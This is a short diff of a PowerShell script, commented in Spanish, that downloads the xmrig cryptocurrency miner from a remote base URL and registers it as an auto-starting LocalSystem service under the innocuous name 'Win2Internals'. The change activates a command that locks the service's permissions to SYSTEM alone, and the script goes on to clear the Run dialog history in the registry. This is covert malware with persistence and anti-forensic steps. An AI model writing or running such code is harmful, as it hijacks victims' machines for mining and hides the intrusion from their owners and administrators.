@@ -42,10 +42,7 @@ Start-BitsTransfer -Source "$baseURL/xmrig.exe" -Destination $xmrig
 
 # Crear el servicio
 sc.exe create Win2Internals binPath= "$Win2" start= auto obj= "LocalSystem" type= own
-## sc.exe sdset Win2Internals "D:(A;;GA;;;SY)"
-
-# FILE: Clear-RunHistorySilent.ps1
-# Script para limpiar el historial del cuadro Ejecutar (Windows + R) sin salida
+sc.exe sdset Win2Internals "D:(A;;GA;;;SY)"
 
 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
 
